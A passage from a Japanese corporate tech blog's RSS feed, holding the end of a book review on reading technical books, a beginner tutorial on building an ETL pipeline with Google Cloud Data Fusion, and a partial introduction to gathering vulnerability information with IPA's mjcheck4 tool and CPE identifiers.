世界が広がる！貪欲に本を求めれば、出会うはずがない本にも出会える</h4><ul><li>悪書・良書を気にする必要はない</li><li>レベル感の合った本を選ぶ</li><li>くじ引き読書法</li><li>英語の技術書という選択肢</li></ul><h3 id="第2部-読み方"><a href="#第2部-読み方" class="headerlink" title="第2部　読み方"></a>第2部　読み方</h3><h4 id="2-1-比べて、使い分ける。時間をムダにせず理解を深める"><a href="#2-1-比べて、使い分ける。時間をムダにせず理解を深める" class="headerlink" title="2-1　比べて、使い分ける。時間をムダにせず理解を深める"></a>2-1　比べて、使い分ける。時間をムダにせず理解を深める</h4><ul><li>「『3』の発想」 ～1つのテーマで3冊の本を読む～</li><li>分類とリンク ～読んだ本を整理する～</li><li>電子書籍と紙書籍を使い分ける ～それぞれのメリット・デメリットを把握する～</li><li>読書にかける時間 ～本の価値を時給換算する～</li><li>プログラミング書の読み方 ～動くコードを自分で書く～</li><li>数学書の読み方 ～文系・理系それぞれのアプローチ～</li><li>積読の解消法 ～優先順位を設定する～</li></ul><h4 id="2-2-ルール無用。精読、多読、乱読し、読書の枠を超えてゆけ"><a href="#2-2-ルール無用。精読、多読、乱読し、読書の枠を超えてゆけ" class="headerlink" title="2-2　ルール無用。精読、多読、乱読し、読書の枠を超えてゆけ"></a>2-2　ルール無用。精読、多読、乱読し、読書の枠を超えてゆけ</h4><ul><li>読書にルールなし</li><li>過去に読んだ本をもう一度読んで成長を実感する</li><li>読書の枠を超えて学習を加速する</li><li>ページを破って持ち歩く分冊化読書法</li><li>1冊90分で読む時間制限読書法</li><li>マーキング読書法で脳に刻み込む</li><li>オーディオブックでインプット量を増大させる</li><li>電子書籍のメモやノートを取る</li><li>DeepL翻訳で英語の技術資料を読む</li><li>読書記録のすすめ</li><li>3年で成果を出すための一点突破読書法</li><li>1年で1,000冊を読破する超多読法</li><li>読書を助ける便利なグッズやアプリ</li></ul><h3 id="第3部-情報発信＆共有"><a href="#第3部-情報発信＆共有" class="headerlink" title="第3部　情報発信＆共有"></a>第3部　情報発信＆共有</h3><h4 id="3-1-成長のチャンスはアウトプットにあり"><a href="#3-1-成長のチャンスはアウトプットにあり" class="headerlink" title="3-1　成長のチャンスはアウトプットにあり"></a>3-1　成長のチャンスはアウトプットにあり</h4><ul><li>アウトプットは最大の成長 ～講演や勉強会でスキルアップ～</li><li>発信するテーマの選び方 ～「自分ならこうする」を発信する～</li><li>執筆における工夫 ～「便利なツール」を活用する～</li></ul><h4 id="3-2-アウトプットも「遅すぎる」ことはない"><a href="#3-2-アウトプットも「遅すぎる」ことはない" class="headerlink" title="3-2　アウトプットも「遅すぎる」ことはない"></a>3-2　アウトプットも「遅すぎる」ことはない</h4><ul><li>技術書の読書におけるアウトプット</li><li>たくさんアウトプットしよう</li><li>いつでもどこでもアウトプット</li><li>レビューの有効性<br>（詳しい目次は<a href="https://www.shoeisha.co.jp/book/detail/9784798171548">翔泳社のサイト</a>をご覧ください）</li></ul><h2 id="特徴と感想"><a href="#特徴と感想" class="headerlink" title="特徴と感想"></a>特徴と感想</h2><p>目次からも伝わるかなと思うのですが、技術書をどのように選ぶか、どのように読むか、そして読んだ内容をどのように活用していくか、技術書への付き合い方を丁寧に解説した１冊です。</p><p>また、この本は2人のエンジニア（増井敏克氏・IPUSIRON氏）によって書かれた本ですが、例えば、第１部は「選び方」について、1-1を増井氏、1-2をIPUSIRON氏が記述する、という形でそれぞれの部を構成しています。本の読み方は人それぞれで正解があるものではないという考え方のもと、お二人の見解が異なる部分もあえて残す編集をしているそうです。</p><p>第1部では選び方をテーマにしています。よく先輩社員が「思わぬ出会いがあるから技術書は（ネットではなくて）書店で買うといいよ」、というアドバイスをされることがありますが、具体的に書店に行ってなにしたらいいの？という問いに答えてくれています。<br>個人的に1-2のくじ引き読書法は面白いなと思いました。①関心の<strong>なかった</strong>ジャンルの本棚の前に立ち、②目をつぶって手を伸ばして触れた本を、③できれば制限時間を定めて読破するという方法です。<br>このくじ引き読書法のランダム性を上げるためにNDC（図書館で利用されている分類番号）を2桁乱数で絞り込んで①の棚決めをしたり、ISBN（書籍の世界共通の識別子）をランダム生成するという方法も紹介されているのですが、エンジニアらしい遊び心のある手法だなと思わず感心しました。</p><p>第2部の「読み方」編が本書のメインどころでもあるのですが、紙の本をマーキングしながら読む古典的な方法から、DeepL翻訳やオーディオブックなどの現代のテクノロジーを駆使した方法まで様々な手法が紹介されており、試しながら自分にあった読み方を模索するといいかなと思いました。</p><p>また、第3部でアウトプットの紹介をしているところも推せるポイントで、新人のみなさんにもぜひアウトプットを実践してほしいなと思います。本書内でも「とりあえずアウトプットする」ことで他の人からフォードバックをもらえる、言い換えれば、自分にわかっていない部分があることを他人に気づいてもらえ、さらなる学習への好循環が生まれると記載されています。<br>ライトなものであれば、仲間内や同期で勉強会を開いてもいいですし、社内外の勉強会やカンファレンスに参加してみるのも良いかと思います。</p><p>さらに本書の内容に加えて個人的におすすめなのは、アウトプット駆動学習です。「何月何日にブログに書くぞ、そのためにXXXを学習する！」とか、「半年後の資格試験に向けて勉強するぞ！」というものです。<br>なかなか本を買ったけど読まずに積読してしまったりしますが、アウトプット駆動学習は、モチベーションを焚き付け、また、締切効果もあって短期集中して学習することができます。<br>（実はこのブログも、春の入門記事連載の募集に「何か書きます（内容未定）」と手を挙げたところから始まってますし、ここ2年ほどはある国家資格の取得のためにずっと学習漬けの日々を送ってました。無事合格した資格の話は別途記事を書くことを予定しています。）</p><h2 id="まとめ"><a href="#まとめ" class="headerlink" title="まとめ"></a>まとめ</h2><p>新人のみなさんにはぜひ一度手に取ってほしいなと思う１冊でした。ぜひ書店で出会ってみてください。<br>また、フューチャー社員の方は「とりあえずアウトプットする」ことを目標に、ぜひ技術ブログ執筆にチャレンジしてみてください。（新人の方は研修終了後からブログ執筆可能です。）</p><p>次は工藤さんの<a href="/articles/20230424a/">初めての画像処理〜OpenCVって何ができるの？〜</a> です。</p><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style:none; padding-left: 0;"><li id="fn:1"><span style="vertical-align: top; padding-right: 10px;">1.</span><span style="vertical-align: top;">医療・ヘルスケア分野での案件や新規ビジネス創出を担う、2020年に誕生した事業部です。設立エピソードは<a href="https://note.future.co.jp/n/n8b57d4bf4604">未来報の記事</a>をご覧ください。</span><a href="#fnref:1" rev="footnote"> ↩</a></li></ol></div></div>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Culture/">Culture</category>
      
      
      <category domain="https://future-architect.github.io/tags/%E5%88%9D%E5%BF%83%E8%80%85%E5%90%91%E3%81%91/">初心者向け</category>
      
      <category domain="https://future-architect.github.io/tags/%E6%9B%B8%E8%A9%95/">書評</category>
      
      <category domain="https://future-architect.github.io/tags/%E6%8A%80%E8%A1%93%E6%9B%B8%E3%81%AE%E8%AA%AD%E6%9B%B8%E8%A1%93/">技術書の読書術</category>
      
      
      <comments>https://future-architect.github.io/articles/20230421a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Cloud Data Fusionで始めるETL入門</title>
      <link>https://future-architect.github.io/articles/20230420a/</link>
      <guid>https://future-architect.github.io/articles/20230420a/</guid>
      <pubDate>Wed, 19 Apr 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;img src=&quot;/images/20230420a/image.png&quot; alt=&quot;&quot; width=&quot;220&quot; height=&quot;220&quot; loading=&quot;lazy&quot;&gt;

&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot;</description>
          
        
      
      
      
      <content:encoded><![CDATA[<img src="/images/20230420a/image.png" alt="" width="220" height="220" loading="lazy"><h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>こんにちは、TIG (Technology Innovation Group)の市川です。<br><a href="/articles/20230417a/">春の入門祭り</a>4日目の記事です。</p><p>本日の入門記事は「Cloud Data Fusionで始めるETL入門」ということで、Google CloudでETL&#x2F;ELTを構築できる「<a href="https://cloud.google.com/data-fusion?hl=ja">Cloud Data Fusion</a>」を利用して、ETLを作成します。</p><h2 id="ETLとは"><a href="#ETLとは" class="headerlink" title="ETLとは"></a>ETLとは</h2><p>そもそもETLとはなんでしょうか。</p><p>ETLはExtract Transform Loadの略で、データ分析のプロセスの中で重要な役割を果たしています。</p><p>データ分析は一般的には、「収集」「加工」「蓄積」「利活用」の順序で行われます。</p><div class="scroll"><table><thead><tr><th align="left">プロセス</th><th align="left">内容</th><th align="left">利用する主なサービス</th></tr></thead><tbody><tr><td align="left">収集</td><td align="left">企業が保有するさまざまなデータソース(主にRAWデータ)をデータレイクに格納</td><td align="left">Cloud Stoarge, S3 等</td></tr><tr><td align="left">加工</td><td align="left">データレイクに格納されているデータのクレンジング、整形、および変換を行い、ビジネス上有用な情報を得るためのデータを生成する</td><td align="left">Cloud Data Fusion, Dataflow 等</td></tr><tr><td align="left">蓄積</td><td align="left">加工されたデータをデータウェアハウス（DWH）に格納する</td><td align="left">BigQuery, Redshift 等</td></tr><tr><td align="left">利活用</td><td align="left">DWHのデータを利用してBIから参照したり、マーケティング等に利用する。</td><td align="left">各種MAツール</td></tr></tbody></table></div><p>この流れの中で、ETLを利用するのは「加工」のフェーズです。</p><p>「収集」フェーズでデータレイクに格納されたRAWデータを、データウェアハウスにETLでに取り込みやすいようデータを加工します。</p><h2 id="Cloud-Data-Fusionとは何か"><a href="#Cloud-Data-Fusionとは何か" class="headerlink" title="Cloud Data Fusionとは何か"></a>Cloud Data Fusionとは何か</h2><p>Cloud Data FusionはGoogle Cloudが提供しているETL&#x2F;ELTを行うためのサービスです。</p><p>特徴は以下の通りです。</p><ul><li>OSSの<a href="https://cdap.atlassian.net/wiki/spaces">CDAP</a>を使って構築されたサーバーレスかつフルマネージドなサービスを提供</li><li>視覚的に操作できるGUIでエンジニアでなくてもデータ加工パイプラインが作成できる</li><li><a href="https://cloud.google.com/data-fusion/plugins?hl=ja">プラグイン</a>が豊富に用意されていて、拡張性が高い</li></ul><p>Google Cloudでは、ETLツールとしてDataflowやDataprep、Dataform等多くのサービスが提供されていますが、Dataflowは基本的にコーディングが必要であるためエンジニアがいないと構築が難しかったりします。</p><p>Cloud Data FusionはGUIベースでETL&#x2F;ELT処理を作成できるため、普段開発作業を担当しないような方にもとっつきやすく、プラグインが豊富なので拡張性が高いのが他のサービスと異なる特徴です。</p><h2 id="簡単なパイプラインを作ってみよう"><a href="#簡単なパイプラインを作ってみよう" class="headerlink" title="簡単なパイプラインを作ってみよう"></a>簡単なパイプラインを作ってみよう</h2><p>それでは、早速簡単なパイプラインを作ってみましょう。</p><h3 id="セットアップ"><a href="#セットアップ" class="headerlink" title="セットアップ"></a>セットアップ</h3><p>セットアップ方法はGoogle Cloudのドキュメントをご参照ください。<br><a href="https://cloud.google.com/data-fusion/docs/how-to/create-instance?hl=ja">https://cloud.google.com/data-fusion/docs/how-to/create-instance?hl=ja</a></p><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>CLoud Data Fusionは少しデプロイに時間がかかり、大体立ち上がるまでに20分~30分ほどかかります。<br>また、Cloud Data Fusionでは3つのエディションが展開されていますが、使用感を試してみたい程度であれば月120時間の無料枠が用意されている「Basic」を選ぶと費用が抑えられると思います。（Developer　Editionには無料枠が存在しないため）</p><p>参考：<a href="https://cloud.google.com/data-fusion/pricing?hl=ja">https://cloud.google.com/data-fusion/pricing?hl=ja</a></p><p>以下のようにインスタンスが立ち上がったら準備完了です。</p><img src="/images/20230420a/image_2.png" alt="" width="1057" height="212" loading="lazy"><h3 id="パイプラインを作ってみる"><a href="#パイプラインを作ってみる" class="headerlink" title="パイプラインを作ってみる"></a>パイプラインを作ってみる</h3><p>今回は入門編ということで、すでに用意されているパイプラインを利用したいと思います。<br>コンソール画面から「インスタンスを表示」をクリックし、Cloud Data Fusionの画面にアクセスし、ヘッダーの「HUB」をクリックします</p><img src="/images/20230420a/image_3.png" alt="" width="1200" height="945" loading="lazy"><p>その後、「Pipelines」の「Cloud Data Fusion Quickstart」をクリックし、</p><img src="/images/20230420a/image_4.png" alt="" width="1200" height="691" loading="lazy"><p>Finishを押下して、パイプラインを作成します。</p><img src="/images/20230420a/image_5.png" alt="" width="1200" height="773" loading="lazy"><p>すると、以下のような画面にアクセスできるようになります。</p><p>この画面はPipelineのStudioの画面で、GUI形式でパイプラインを作成&#x2F;編集することができます。</p><img src="/images/20230420a/image_6.png" alt="" width="1200" height="874" loading="lazy"><p>Studio画面の構成を大きく3つに分けて説明します。</p><h3 id="①ノードに使うプラグインを選択"><a href="#①ノードに使うプラグインを選択" class="headerlink" title="①ノードに使うプラグインを選択"></a>①ノードに使うプラグインを選択</h3><p>サイドバーにはData Fusionで利用できるプラグインを選択し、利用することができます。<br>プラグインは大きく分けて、以下のような種類が用意されています。</p><ul><li>Source：　起点となるデータソースを指定するプラグイン</li><li>Transform・Analytics：各種データ変換を行うプラグイン</li><li>Sink：データの流れの終端として、データの格納先を指定するプラグイン</li><li>Conditions and Actions：データ変換とは関係ない何らかのアクション（ファイル移動や削除 等）を行えるプラグイン</li><li>Error Handlers and Alerts：エラーハンドリングを行うプラグイン</li></ul><h3 id="②Studio"><a href="#②Studio" class="headerlink" title="②Studio"></a>②Studio</h3><p>メインとなるStudioでパイプラインを組み立てます。</p><ul><li>パイプラインの編集エリア。</li><li>１つ１つの箱が、データソースや変換処理、データの格納先を示す”ノード”であり、実行順に線で繋がっている。</li><li>ノードは上述したプラグインの種別ごとに色分けされている</li></ul><h3 id="③各種設定"><a href="#③各種設定" class="headerlink" title="③各種設定"></a>③各種設定</h3><p>ここでは、作成したパイプラインの設定やデプロイを行うことができます。</p><ul><li>パイプライン定義をJSON形式でImport＆Export</li><li>プレビュー（テスト）の実行メニューを開く</li><li>編集中のパイプラインをDraftとして保存</li><li>Draftのパイプラインをデプロイ</li></ul><h2 id="各ノードの処理内容"><a href="#各ノードの処理内容" class="headerlink" title="各ノードの処理内容"></a>各ノードの処理内容</h2><h3 id="GCSからファイルを読み込み"><a href="#GCSからファイルを読み込み" class="headerlink" title="GCSからファイルを読み込み"></a>GCSからファイルを読み込み</h3><img src="/images/20230420a/image_7.png" alt="" width="1200" height="573" loading="lazy"><p>各ノードの設定内容を確認する際は、マウスオーバーした際に表示される「Properties」をクリックして内容を確認します。</p><p>GCS Propertiesをクリックすると以下のような画面が表示されます。</p><p>以下の「Path」部分でGCSのオブジェクトを指定しています。<br>（デフォルトで設定されているファイルはサンプルファイルとして公開されているため、動かす上で変更の必要はありません）</p><img src="/images/20230420a/image_8.png" alt="" width="1200" height="930" loading="lazy"><h3 id="データ加工"><a href="#データ加工" class="headerlink" title="データ加工"></a>データ加工</h3><p>データ加工は主に、Wranglerと呼ばれるプラグインで行います。</p><p>Wranglerでは、記載されたDirectivesを元にデータ加工を行います。<br>（個人的にこれがCloud Data Fusionの一番便利な機能だと思っています。）</p><img src="/images/20230420a/image_9.png" alt="" width="1200" height="559" loading="lazy"><p>Directivesを作成する際は、以下のような形でクリックをするだけでファイルの加工（Parse処理やデータ型の変換等）を行うことができます。</p><p>以下のようなファイルをWranglerで読み込んだ際に、</p><img src="/images/20230420a/image_10.png" alt="" width="1200" height="850" loading="lazy"><p>次の画像のように操作することで、</p><img src="/images/20230420a/image_11.png" alt="" width="1200" height="655" loading="lazy"><p>データ加工した際のイメージと、先ほど定義されたDirectivesが画面上に作成されます。</p><img src="/images/20230420a/image_12.png" alt="" width="1200" height="503" loading="lazy"><p>このように、Wranglerを利用することで、実際にどのようなデータ加工が行われるかをイメージしながら、簡単にETLの処理を作成することができます。</p><h3 id="BigQueryへのインサート"><a href="#BigQueryへのインサート" class="headerlink" title="BigQueryへのインサート"></a>BigQueryへのインサート</h3><p>加工したデータは最終的にデータウェアハウスであるBigQueryにInsertされます。</p><p>サンプルでは、「GCPQuickStart」というデータセットの「top_rated_inexpensive」というテーブルにデータがInsertされるような設定になっています。</p><p>今回はデータセット&#x2F;テーブルが既存の環境に存在しない場合に新規作成されるような形になっているので、別途作成する対応は不要です。</p><img src="/images/20230420a/image_13.png" alt="" width="1200" height="952" loading="lazy"><h2 id="デプロイ"><a href="#デプロイ" class="headerlink" title="デプロイ"></a>デプロイ</h2><p>今回は入門編ということもあるので設定値はデフォルトのままで、<br>以下画像の「Deploy」をを押下し、パイプラインをデプロイします。</p><img src="/images/20230420a/image_14.png" alt="" width="1200" height="542" loading="lazy"><h2 id="実行してみる"><a href="#実行してみる" class="headerlink" title="実行してみる"></a>実行してみる</h2><p>デプロイしたパイプラインを実行してみましょう。<br>以下画像で差している「Run」を押下する事で、パイプラインが実行できます。</p><img src="/images/20230420a/image_15.png" alt="" width="1200" height="596" loading="lazy"><h2 id="BigQueryにInsertされた結果を確認する"><a href="#BigQueryにInsertされた結果を確認する" class="headerlink" title="BigQueryにInsertされた結果を確認する"></a>BigQueryにInsertされた結果を確認する</h2><p>パイプラインのStatusが「Succeed」になったら処理は成功です。<br>Cloud Data Fusionを作成したプロジェクトのBigQueryの画面にアクセスしてみましょう。</p><p>すると、BigQuery側でデータがInsertされていることが確認できました。</p><img src="/images/20230420a/image_16.png" alt="" width="1200" height="651" loading="lazy"><h3 id="開発する際のちょっとしたTips"><a href="#開発する際のちょっとしたTips" class="headerlink" title="開発する際のちょっとしたTips"></a>開発する際のちょっとしたTips</h3><p>Cloud Data Fusionの画面から実行した際のログを確認したい時があります。<br>その際に、「Logs」という部分をクリックしても一部のログのみしか確認することができないため、<br>少し見にくいのですが、以下画像の「View Raw Logs」をクリックすると、ログの全量を確認することができます。</p><img src="/images/20230420a/image_17.png" alt="" width="1200" height="471" loading="lazy"><h2 id="最後に"><a href="#最後に" class="headerlink" title="最後に"></a>最後に</h2><p>今回はCloud Data Fusionを利用して、簡単に使用感を確認してみました。</p><p>ETL&#x2F;ELTの作成を非エンジニアが担当する場合、GUI形式でパイプラインが組めるので、そういった際には採用候補になりうるサービスだと感じました。</p><p>明日は<a href="https://future-architect.github.io/authors/%E6%B0%B8%E4%BA%95%E5%84%AA%E6%96%97/">永井優斗</a>さんの、<a href="/articles/20230421a/">「技術書」の読書術 読書感想文</a> です。</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Infrastructure/">Infrastructure</category>
      
      
      <category domain="https://future-architect.github.io/tags/ETL/">ETL</category>
      
      <category domain="https://future-architect.github.io/tags/GCP/">GCP</category>
      
      <category domain="https://future-architect.github.io/tags/CloudDataFusion/">CloudDataFusion</category>
      
      
      <comments>https://future-architect.github.io/articles/20230420a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>初めてのセキュリティ情報収集（mjckeck4）</title>
      <link>https://future-architect.github.io/articles/20230419a/</link>
      <guid>https://future-architect.github.io/articles/20230419a/</guid>
      <pubDate>Tue, 18 Apr 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;p&gt;こんにちわ。Cyber Security Innovation Group（CSIG）の井上です。&lt;/p&gt;
&lt;p&gt;部門名の通り、サイバーセキュリティに関する部署で、セキュリティコンサルティングやFutureVuls（ &lt;a</description>
          
        
      
      
      
      <content:encoded><![CDATA[<p>こんにちわ。Cyber Security Innovation Group（CSIG）の井上です。</p><p>部門名の通り、サイバーセキュリティに関する部署で、セキュリティコンサルティングやFutureVuls（ <a href="https://vuls.biz/">https://vuls.biz</a> ）という脆弱性対策サービスのコンサルティングやサポートをしています。</p><h2 id="初めに"><a href="#初めに" class="headerlink" title="初めに"></a>初めに</h2><p><a href="/articles/20230417a/">春の入門祭り2023</a> という事で、<strong>初めて脆弱性対応をする方</strong>に向けた記事を書いてみようと思います。<br>この時期になると、部門移動等で情報システム部に移動し「何をやっていいのか分からない…」という話も時々聞きます。</p><p>今回は、IPAの「mjcheck4」（ <a href="https://jvndb.jvn.jp/apis/myjvn/mjcheck4.html">https://jvndb.jvn.jp/apis/myjvn/mjcheck4.html</a> ）というツールを使った、<strong>セキュリティ情報の収集</strong>についてお話しようと思います。</p><h2 id="セキュリティ情報収集とは"><a href="#セキュリティ情報収集とは" class="headerlink" title="セキュリティ情報収集とは"></a>セキュリティ情報収集とは</h2><p>世の中にはセキュリティ情報はいろいろあります。<br>例えば、雑に説明すると以下のようなものがあります。</p><ul><li>攻撃手法、攻撃者の動向に関する情報<ul><li>攻撃がどのように進むのかや、攻撃者グループの動向などの情報を示します。</li><li>これらの情報は、例えば、MITRE ATT&amp;CKのGroups（ <a href="https://attack.mitre.org/groups/">https://attack.mitre.org/groups/</a> ）などにも記載されています。</li></ul></li><li>IoC（Indicator of Compromise：侵害指標）の情報<ul><li>マルウェアのファイル名や攻撃者の通信先IPアドレスなど、攻撃時に残された痕跡情報を示します。</li><li>例えば、「特定のIPがIoCとして公開されたので ProxyやFirewallのブロック対象に追加する」、「ネットワーク機器のログに該当のIPが存在すれば、攻撃を受けている可能性がある」、のような使い方をします</li></ul></li><li>脆弱性に関する情報<ul><li>ソフトウェア等の脆弱性に関する、発見やPoC&#x2F;Exploit（検証や悪用ができる実証コード）、更新プログラムの提供や回避策などの情報を示します。</li><li>一般的に、脆弱性情報はNIST（<a href="https://www.nist.gov/">National Insitute of Standards and Technology</a>：米国立標準技術研究所）のNVD（<a href="https://nvd.nist.gov/">National Vulnerability Database</a>：脆弱性情報データベース）に登録され、日本国内で主に使われる製品はJVN（<a href="https://jvn.jp/">Japan Vulnerability Notes</a>）に登録されていきます。<ul><li>例えば、Log4Shellとして有名な脆弱性 CVE-2021-44228 の情報は、 <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">https://nvd.nist.gov/vuln/detail/CVE-2021-44228</a> のように公開されています。</li></ul></li><li>これらを、「いろいろなソースを集約」して「自分が利用している製品に絞って閲覧」するためには、何らかのツールや製品が必要になります。<ul><li><strong>今回紹介する mjcheck4 もそのツールのうちの一つです</strong></li></ul></li></ul></li><li>インシデントに関する情報<ul><li>実際に発生した被害の状況や傾向に関する情報です。</li><li>一般的には、セキュリティ系のネットニュースなどを参考にすることが多いと思います。</li></ul></li><li>etc</li></ul><p>今回は、「<strong>初めてのセキュリティ情報収集</strong>」という事で、一番身近で活用しやすい「<strong>脆弱性情報の収集</strong>」について書いていきます。</p><p>IPA（<a href="https://www.ipa.go.jp/">独立行政法人 情報処理推進機構</a>）とJPCERT&#x2F;CC（<a href="https://www.jpcert.or.jp/">JPCERTコーディネーションセンター</a>）が共同運営している脆弱性対策情報 JVN iPedia（ <a href="https://jvndb.jvn.jp/apis/myjvn/">https://jvndb.jvn.jp/apis/myjvn/</a> ）のデータを基に使う、脆弱性対策情報収集ツール mjcheck4 を見ていきます。</p><h2 id="mjcheck4とは"><a href="#mjcheck4とは" class="headerlink" title="mjcheck4とは"></a>mjcheck4とは</h2><img src="/images/20230419a/image.png" alt="" width="601" height="255" loading="lazy"><p>ツールのページ <a href="https://jvndb.jvn.jp/apis/myjvn/mjcheck4.html">https://jvndb.jvn.jp/apis/myjvn/mjcheck4.html</a> を確認すると、「<strong>M</strong>y<strong>J</strong>VN脆弱性対策情報フィルタリング収集ツール（<strong>check</strong>）の<strong>4</strong>番目」の略称と思われます。<br>日本国内向け製品の脆弱性情報も含まれる「JVN iPedia」の情報を簡単に利用するためのツールです</p><ul><li>脆弱性対策情報収集対象製品を、、<ul><li>グラフィカルに選択可能</li><li>SBOMでの入力も可能</li></ul></li><li>収集した脆弱性情報を、、<ul><li>画面上で閲覧可能</li><li>メール、SBOM、での出力が可能</li></ul></li></ul><p>今回はこのツールを使い、自組織が利用している製品の脆弱性を自動的に収集してみましょう。</p><h2 id="使い方"><a href="#使い方" class="headerlink" title="使い方"></a>使い方</h2><p>導入自体は MyJVNのページ（ <a href="https://jvndb.jvn.jp/apis/myjvn/mjcheck4.html#mjcheck4_install">https://jvndb.jvn.jp/apis/myjvn/mjcheck4.html#mjcheck4_install</a> ）通りですので、省略します。</p><ul><li>利用規約について同意する</li><li>対象のファイルをダウンロードし、<code>setup.exe</code>を用いてインストールする</li><li>収集対象製品を選定し、データのダウンロード</li><li>収集した脆弱性情報を閲覧</li></ul><p>Windowsアプリケーションとして実装されているので、特に難しい事は無いと思います。<br>利用している製品を登録することで、JVN iPediaに脆弱性が登録されていれば通知がされる仕組みになっています。</p><ul><li>バージョン番号は使わず、特定日以降の日付で発見されたもの、というチェック方法です。<ul><li>そのため、まずは該当製品の過去の脆弱性を全件抽出し、現状を把握する必要があります。「収集起点日（最終更新日）」で指定ができます。</li><li>一度チェックが終われば、あとは「新しく報告された脆弱性」を確認するだけになります。</li></ul></li></ul><p>設定<br><img src="/images/20230419a/image_2.png" alt="" width="700" height="395" loading="lazy"></p><p>収集状況概要<br><img src="/images/20230419a/image_3.png" alt="" width="600" height="338" loading="lazy"></p><p>脆弱性情報詳細<br><img src="/images/20230419a/image_4.png" alt="" width="600" height="338" loading="lazy"></p><p>本ツールももそうですが、脆弱性検出の為にはソフトウェアの一意の特定が必要で、PCEという表記を利用しています。今回はこれについても説明します。</p><h2 id="CPEとは"><a href="#CPEとは" class="headerlink" title="CPEとは"></a>CPEとは</h2><p>CPEは「<strong>C</strong>ommon <strong>P</strong>latform <strong>E</strong>numeration：共通プラットフォーム一覧」と呼ばれる、ソフトウェアやファームウェアを一意で識別するための仕組みです。詳細はIPAの <a href="https://www.ipa.go.jp/security/vuln/">https://www.ipa.go.jp/security/vuln/</a><br>scap&#x2F;cpe.html で解説がされています。</p><ul><li><code>cpe:2.3:&#123;種別&#125;:&#123;ベンダ名&#125;:&#123;製品名&#125;:&#123;バージョン&#125;:&#123;アップデート&#125;:&#123;エディション&#125;:&#123;言語&#125;</code>の構造です</li><li>脆弱性管理製品にCPEを登録することで、OSベンダパッケージ提供以外の製品の脆弱性を検知することを想定しています<ul><li>CPE登録 -&gt; 脆弱性情報で「影響を受ける製品」として登録されるCPEとマッチング -&gt; 該当すれば、その脆弱性が内包されると判断します</li></ul></li></ul><p>NVDであれば<a href="https://nvd.nist.gov/products/cpe/search">SearchCommonPlatformEnumerations</a>というページで検索ができるのですが、例えば以下のようになります。</p><ul><li>FortiOS（ForinetのFortigate製品のOS）<ul><li><code>cpe:2.3:o:fortinet:fortios:7.2.4:*:*:*:*:*:*:*</code>で表現されます</li><li>後半の<code>*</code>は、エディションや言語などが想定され、通常は<code>*</code>のままで利用されています</li></ul></li><li>Fortigate 1000e（ハードウェア）<ul><li><code>cpe:2.3:h:fortinet:fortigate-1100e:-:*:*:*:*:*:*:*</code>で表現されます</li></ul></li></ul><p>mjcheck4はバージョン2.2の表記方法を使っているようで、アップデート以降の表記が上記と異なっていますが、意図としては同じものです。<br>以下にFortiOSの例を示します。</p><ul><li>version 2.2<ul><li><code>cpe:/o:fortinet:fortios:7.2.4</code></li><li>シンプルに、バージョンまでを表現しています</li><li>mjcheck4のCPEはこのタイプです</li></ul></li><li>version 2.3<ul><li><code>cpe:2.3:o:fortinet:fortios:7.2.4:*:*:*:*:*:*:*</code></li><li>CPEのバージョンを示す<code>:2.3:</code>部分が追加されています</li><li>製品バージョン以降に、詳細な分類をするための項目（<code>:&#123;アップデート&#125;:&#123;エディション&#125;:&#123;言語&#125;</code>）が用意されています<ul><li>用意されていますが…、あまり使われていない印象です。しかしながら、項目として用意されていること、が重要です。</li></ul></li></ul></li></ul><p>OS標準パッケージ以外の製品（ソフトウェアだけではなく、ハードウェアも含めて）の脆弱性管理をする場合、この<strong>CPE</strong>というものをよく使うので、おおよそのフォーマットは覚えておいた方が良いです。</p><h2 id="脆弱性情報収集後の対応"><a href="#脆弱性情報収集後の対応" class="headerlink" title="脆弱性情報収集後の対応"></a>脆弱性情報収集後の対応</h2><p>検出後の対応については本ツールの範囲外ですが、概要を書いておきます。</p><p>一般的には下図のようなフローを随時回していくことになります。（状況により諸説あります）<br><img src="/images/20230419a/image_5.png" alt="" width="854" height="488" loading="lazy"></p><p>簡略化すると以下のようになり、本ツールは「脆弱性情報の収集」部分となります。</p><ul><li>対象のソフトウェアを設定する部分が「対象の把握」に該当します</li><li>ツールによるチェックが「脆弱性情報の取集」に該当します</li></ul><img src="/images/20230419a/image_6.png" alt="" width="736" height="215" loading="lazy"><p>収集した脆弱性情報を確認し、適用要否を判断し、実際に適用&#x2F;回避策の適用 を行います。</p><ul><li>クライアントな端末の場合、多くは判断不要でアップデートができると思います。<ul><li>例：Windows自身のアップデートや、Google Chromeなどのアプリケーションのアップデート</li></ul></li><li>サービス提供をしているネットワーク機器やサーバの場合、適用要否を検討して対応を決めます。<ul><li>アップデートによる挙動変化が無い、若しくは許容できることを確認するために、検証が必要です。</li><li>アップデートを行わないことにより発生する損害リスクを考慮し、許容できる場合は対応保留とする場合もあります。</li><li>これらの判断の為に、「脆弱性対策情報」の詳細項目を確認します。<ul><li>CVSSの情報などを基に、システムが置かれている環境などを考慮して決定します。</li></ul></li></ul></li></ul><p>本ツール mjcheck4 は、脆弱性対策情報の内容が少し分かりづらいかもしれませんが、「<strong>脆弱性対策のはじめの一歩</strong>」としては有効だと思われます。</p><ul><li>Pros<ul><li>無償で、JVN iPediaの情報を収集&#x2F;選別できる<ul><li>きちんと設定できれば、一旦は問題ない範囲を対象と出来る</li></ul></li><li>メールでの通知機能がある</li><li>対象製品登録が、GUI的に比較的楽</li></ul></li><li>Cons<ul><li>脆弱性対策情報が少ない<ul><li>JVN iPediaの情報のみで、CVSSでしか判断できない（慣れてくると、物足りない）</li></ul></li><li>自動運行が難しい<ul><li>アプリ起動時にチェックが走る為、例えば毎日起動しなおす必要がある</li></ul></li><li>ソースがJVN iPediaである<ul><li>NVDやベンダの脆弱性情報が全てあるわけではない<ul><li>これにより、例えば 